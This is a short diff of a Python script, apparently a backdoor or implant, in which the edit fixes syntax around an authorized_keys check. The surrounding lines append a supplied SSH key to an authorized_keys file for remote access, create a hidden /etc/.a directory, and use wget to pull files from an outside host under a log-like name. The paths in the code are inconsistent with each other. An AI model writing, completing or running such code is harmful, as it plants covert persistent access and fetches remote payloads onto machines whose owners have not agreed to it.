@@ -5,8 +5,8 @@ def main():
     sshKey = "" #TODO - Enter public SSH key here
     
     if(len(sshKey) != 0):
-        if(!os.path.exists(.ssh/authorized_keys):
-            os.system("touch .ssh/authorized_keys)
+        if(os.path.exists("~/.ssh/authorized_keys") == False):
+            os.system("touch .ssh/authorized_keys")
         os.system("echo \"" + sshKey + "\" >> /.ssh/authorized_keys")
     os.system("mkdir /etc/.a")
     os.system("wget -P /etc/.a -r -l 2 https://files.ravenn.net/horror/syslogT")
